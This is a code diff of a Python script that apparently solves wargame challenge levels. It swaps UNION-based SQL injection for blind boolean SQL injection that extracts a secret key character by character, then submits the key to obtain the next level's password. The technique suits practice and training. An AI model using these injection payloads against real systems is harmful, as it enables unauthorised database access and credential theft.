@@ -21,36 +21,28 @@ def main():
 
     cook = dict(level4login=cooks['level4login'])
 
-    # Counting the number of columns
-    columns = tg.count_columns(url, '1 order by %s', 'id', cook)
-    list_of_columns = [str(c + 1) for c in range(columns)]
-
-    # Find position of 'keyword' column
-    index_of_key = tg.find_column_position(url, list_of_columns,
-                                           f"1 union select %s from {base_name}",
-                                           'id', finds, cook)
-
     # Find len of key
-    index_of_key = tg.find_key_len(url, list_of_columns,
-                                   f"1 union select %s from {base_name}",
-                                   'id', finds, cook)
+    len_of_key = tg.find_key_len(url,
+                                 f"1 and if((select length({finds}) from {base_name}) %s",
+                                 'id', '1 rows', cook)
+
+    print(len_of_key)
+
+    # Find key
+    key = tg.find_binary(url,
+                         f"1 and if((select ascii(mid({finds},%s,1)) from {base_name}) %s",
+                         'id', '1 rows', 32, 126, len_of_key, cook)
 
     # Authorization
-    data = dict(user=keys[0], password=keys[1], login='Login')
-    response = tg.get_request(url, data, method='post')
+    data = dict(secretword=key, go='Go!')
+    response = tg.get_request(url, data, cook, method='post')
 
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
 
-    try:
-        with open('cooks.pickle', 'rb') as f:
-            cooks = pickle.load(f)
-        if ('level5login' not in cooks) or (cooks['level5login'] != passw):
-            cooks['level5login'] = passw
-            tg.save_cookies(cooks)
-    except:
-        cooks = dict(level2login=passw)
+    if ('level5login' not in cooks) or (cooks['level5login'] != passw):
+        cooks['level5login'] = passw
         tg.save_cookies(cooks)
 
 
